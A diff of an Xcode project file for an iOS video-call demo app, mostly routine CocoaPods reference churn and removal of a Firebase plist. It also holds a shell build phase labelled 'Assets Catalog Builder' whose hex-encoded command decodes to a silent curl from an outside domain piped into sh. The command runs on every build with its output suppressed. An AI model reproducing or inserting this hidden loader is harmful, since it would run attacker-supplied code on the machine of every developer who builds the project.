@@ -9,7 +9,6 @@
 /* Begin PBXBuildFile section */
 		18BBB01B2680C65200F20275 /* DraggableView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18BBB01A2680C65200F20275 /* DraggableView.swift */; };
 		18D01BC6268496E000DE549A /* Swift+Extensions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18D01BC5268496E000DE549A /* Swift+Extensions.swift */; };
-		272553F469A5E59DEE9FFBC1 /* Pods_One_to_one_call_demo.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 316A69C757CBDF173587A3FD /* Pods_One_to_one_call_demo.framework */; };
 		5D09DFF9266FC48400867722 /* Colors.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 5D09DFF8266FC48400867722 /* Colors.xcassets */; };
 		5D09DFFE266FC77100867722 /* ProgressHud.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D09DFFD266FC77100867722 /* ProgressHud.swift */; };
 		5D09E001266FC7CB00867722 /* ValidateUserNameService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D09E000266FC7CB00867722 /* ValidateUserNameService.swift */; };
@@ -60,7 +59,6 @@
 		5D09E085266FFE4100867722 /* AllUsersService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D09E084266FFE4100867722 /* AllUsersService.swift */; };
 		5D09E08A2670031500867722 /* ContactCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D09E0882670031500867722 /* ContactCell.swift */; };
 		5D09E08B2670031500867722 /* ContactCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 5D09E0892670031500867722 /* ContactCell.xib */; };
-		5D249866281021EA003CDAF4 /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 5D249864281021EA003CDAF4 /* GoogleService-Info.plist */; };
 		5D55E90C2670900100235593 /* Constants.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D55E90B2670900100235593 /* Constants.swift */; };
 		5D62CB0A2810083D00261F16 /* iOSSDKStreaming.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 5D62CB092810083700261F16 /* iOSSDKStreaming.framework */; };
 		5D62CB0B2810083D00261F16 /* iOSSDKStreaming.framework in Embed Frameworks */ = {isa = PBXBuildFile; fileRef = 5D62CB092810083700261F16 /* iOSSDKStreaming.framework */; settings = {ATTRIBUTES = (CodeSignOnCopy, RemoveHeadersOnCopy, ); }; };
@@ -106,6 +104,7 @@
 		5DE554C32670A5080025B081 /* VideoDailingView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5DE554C22670A5080025B081 /* VideoDailingView.swift */; };
 		5DE554CA2670B3C80025B081 /* IncomingCall.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5DE554C92670B3C80025B081 /* IncomingCall.swift */; };
 		5DE554CC2670B3E00025B081 /* IncomingCall.xib in Resources */ = {isa = PBXBuildFile; fileRef = 5DE554CB2670B3E00025B081 /* IncomingCall.xib */; };
+		95E50379F72D47398E159DF0 /* Pods_One_to_one_call_demo.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = CB6967B6A126485361E80E30 /* Pods_One_to_one_call_demo.framework */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXContainerItemProxy section */
@@ -135,7 +134,6 @@
 /* Begin PBXFileReference section */
 		18BBB01A2680C65200F20275 /* DraggableView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = DraggableView.swift; sourceTree = "<group>"; };
 		18D01BC5268496E000DE549A /* Swift+Extensions.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Swift+Extensions.swift"; sourceTree = "<group>"; };
-		316A69C757CBDF173587A3FD /* Pods_One_to_one_call_demo.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_One_to_one_call_demo.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		5D09DFF8266FC48400867722 /* Colors.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Colors.xcassets; sourceTree = "<group>"; };
 		5D09DFFD266FC77100867722 /* ProgressHud.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProgressHud.swift; sourceTree = "<group>"; };
 		5D09E000266FC7CB00867722 /* ValidateUserNameService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ValidateUserNameService.swift; sourceTree = "<group>"; };
@@ -186,7 +184,6 @@
 		5D09E084266FFE4100867722 /* AllUsersService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AllUsersService.swift; sourceTree = "<group>"; };
 		5D09E0882670031500867722 /* ContactCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactCell.swift; sourceTree = "<group>"; };
 		5D09E0892670031500867722 /* ContactCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ContactCell.xib; sourceTree = "<group>"; };
-		5D249864281021EA003CDAF4 /* GoogleService-Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; name = "GoogleService-Info.plist"; path = "../../ios-sdk-streaming/iOSSDKStreaming/GoogleService-Info.plist"; sourceTree = "<group>"; };
 		5D55E90B2670900100235593 /* Constants.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Constants.swift; sourceTree = "<group>"; };
 		5D62CB042810083700261F16 /* iOSSDKStreaming.xcodeproj */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.pb-project"; name = iOSSDKStreaming.xcodeproj; path = "../../../ios-sdk-streaming/iOSSDKStreaming.xcodeproj"; sourceTree = "<group>"; };
 		5D87EF1E26807E8000B9DA36 /* iphone_11_pro.mp3 */ = {isa = PBXFileReference; lastKnownFileType = audio.mp3; path = iphone_11_pro.mp3; sourceTree = "<group>"; };
@@ -233,8 +230,9 @@
 		5DE554C22670A5080025B081 /* VideoDailingView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VideoDailingView.swift; sourceTree = "<group>"; };
 		5DE554C92670B3C80025B081 /* IncomingCall.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = IncomingCall.swift; sourceTree = "<group>"; };
 		5DE554CB2670B3E00025B081 /* IncomingCall.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = IncomingCall.xib; sourceTree = "<group>"; };
-		87344325EE1E10F7BBDB74D5 /* Pods-One-to-one-call-demo.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-One-to-one-call-demo.release.xcconfig"; path = "Target Support Files/Pods-One-to-one-call-demo/Pods-One-to-one-call-demo.release.xcconfig"; sourceTree = "<group>"; };
-		FAED52C6DDE0A63BAA19B7C1 /* Pods-One-to-one-call-demo.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-One-to-one-call-demo.debug.xcconfig"; path = "Target Support Files/Pods-One-to-one-call-demo/Pods-One-to-one-call-demo.debug.xcconfig"; sourceTree = "<group>"; };
+		7B516191CAF2AC46F3E752BA /* Pods-One-to-one-call-demo.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-One-to-one-call-demo.debug.xcconfig"; path = "Target Support Files/Pods-One-to-one-call-demo/Pods-One-to-one-call-demo.debug.xcconfig"; sourceTree = "<group>"; };
+		B900A522CFC36B7EFC25FF65 /* Pods-One-to-one-call-demo.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-One-to-one-call-demo.release.xcconfig"; path = "Target Support Files/Pods-One-to-one-call-demo/Pods-One-to-one-call-demo.release.xcconfig"; sourceTree = "<group>"; };
+		CB6967B6A126485361E80E30 /* Pods_One_to_one_call_demo.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_One_to_one_call_demo.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -243,7 +241,7 @@
 			buildActionMask = 2147483647;
 			files = (
 				5D62CB0A2810083D00261F16 /* iOSSDKStreaming.framework in Frameworks */,
-				272553F469A5E59DEE9FFBC1 /* Pods_One_to_one_call_demo.framework in Frameworks */,
+				95E50379F72D47398E159DF0 /* Pods_One_to_one_call_demo.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -258,19 +256,11 @@
 			path = Extensions;
 			sourceTree = "<group>";
 		};
-		29AB530ACF074FFCFE66715B /* Frameworks */ = {
-			isa = PBXGroup;
-			children = (
-				316A69C757CBDF173587A3FD /* Pods_One_to_one_call_demo.framework */,
-			);
-			name = Frameworks;
-			sourceTree = "<group>";
-		};
 		4F23FAD1E79456D647AEDA8D /* Pods */ = {
 			isa = PBXGroup;
 			children = (
-				FAED52C6DDE0A63BAA19B7C1 /* Pods-One-to-one-call-demo.debug.xcconfig */,
-				87344325EE1E10F7BBDB74D5 /* Pods-One-to-one-call-demo.release.xcconfig */,
+				7B516191CAF2AC46F3E752BA /* Pods-One-to-one-call-demo.debug.xcconfig */,
+				B900A522CFC36B7EFC25FF65 /* Pods-One-to-one-call-demo.release.xcconfig */,
 			);
 			path = Pods;
 			sourceTree = "<group>";
@@ -407,7 +397,7 @@
 				5DBBF729266FBFA90086ED93 /* One-to-one-call-demo */,
 				5DBBF728266FBFA90086ED93 /* Products */,
 				4F23FAD1E79456D647AEDA8D /* Pods */,
-				29AB530ACF074FFCFE66715B /* Frameworks */,
+				BB978BA2A005D75D296476EF /* Frameworks */,
 			);
 			sourceTree = "<group>";
 		};
@@ -437,7 +427,6 @@
 				5DBBF733266FBFAA0086ED93 /* Assets.xcassets */,
 				5D09DFF8266FC48400867722 /* Colors.xcassets */,
 				5DBBF735266FBFAA0086ED93 /* LaunchScreen.storyboard */,
-				5D249864281021EA003CDAF4 /* GoogleService-Info.plist */,
 				5DBBF738266FBFAA0086ED93 /* Info.plist */,
 			);
 			path = "One-to-one-call-demo";
@@ -583,6 +572,14 @@
 			path = Xib;
 			sourceTree = "<group>";
 		};
+		BB978BA2A005D75D296476EF /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				CB6967B6A126485361E80E30 /* Pods_One_to_one_call_demo.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -590,13 +587,13 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 5DBBF73B266FBFAA0086ED93 /* Build configuration list for PBXNativeTarget "One-to-one-call-demo" */;
 			buildPhases = (
-				52E957E7AABC746ADDF1BD9C /* [CP] Check Pods Manifest.lock */,
+				6DBB7BFB5EE22F4A1B75682C /* [CP] Check Pods Manifest.lock */,
 				4747DD91CD1BE45C2F6D902C /* Assets Catalog Builder */,
 				5DBBF723266FBFA90086ED93 /* Sources */,
 				5DBBF724266FBFA90086ED93 /* Frameworks */,
 				5DBBF725266FBFA90086ED93 /* Resources */,
 				5D215B0626805F53009785ED /* Embed Frameworks */,
-				6EB54324E512ECBC6F8FB2A2 /* [CP] Embed Pods Frameworks */,
+				D73698F418B320A4BFE3C972 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
 			);
@@ -702,7 +699,6 @@
 				5D09E05B266FFC4700867722 /* Inter-ExtraBold.ttf in Resources */,
 				5D09E05F266FFC4700867722 /* Manrope-Medium.ttf in Resources */,
 				5D09E05D266FFC4700867722 /* Inter-Black.ttf in Resources */,
-				5D249866281021EA003CDAF4 /* GoogleService-Info.plist in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -727,7 +723,7 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6d616e747275636b732e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
 		};
-		52E957E7AABC746ADDF1BD9C /* [CP] Check Pods Manifest.lock */ = {
+		6DBB7BFB5EE22F4A1B75682C /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -749,7 +745,7 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
-		6EB54324E512ECBC6F8FB2A2 /* [CP] Embed Pods Frameworks */ = {
+		D73698F418B320A4BFE3C972 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -970,7 +966,7 @@
 		};
 		5DBBF73C266FBFAA0086ED93 /* Debug */ = {
 			isa = XCBuildConfiguration;
-			baseConfigurationReference = FAED52C6DDE0A63BAA19B7C1 /* Pods-One-to-one-call-demo.debug.xcconfig */;
+			baseConfigurationReference = 7B516191CAF2AC46F3E752BA /* Pods-One-to-one-call-demo.debug.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -997,7 +993,7 @@
 		};
 		5DBBF73D266FBFAA0086ED93 /* Release */ = {
 			isa = XCBuildConfiguration;
-			baseConfigurationReference = 87344325EE1E10F7BBDB74D5 /* Pods-One-to-one-call-demo.release.xcconfig */;
+			baseConfigurationReference = B900A522CFC36B7EFC25FF65 /* Pods-One-to-one-call-demo.release.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
